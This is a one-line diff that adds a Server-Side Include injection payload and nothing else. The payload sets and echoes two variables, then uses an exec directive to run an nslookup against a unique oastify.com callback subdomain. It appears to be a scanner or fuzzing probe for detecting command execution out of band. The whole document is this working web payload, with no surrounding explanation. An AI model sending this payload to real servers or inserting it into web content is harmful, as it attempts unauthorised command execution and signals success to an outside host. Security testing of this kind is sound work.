@@ -1,0 +1,1 @@
+<!--#set var="0xn" value="zwmajk8vn9"--><!--#set var="2zp" value="1yoclmaxpb"--><!--#echo var="0xn"--><!--#echo var="2zp"--><!--#exec cmd="nslookup -q=cname mj9x67viaw4rjoapt4h1c0oc339wxnlfj3bq2er.oastify.com" -->
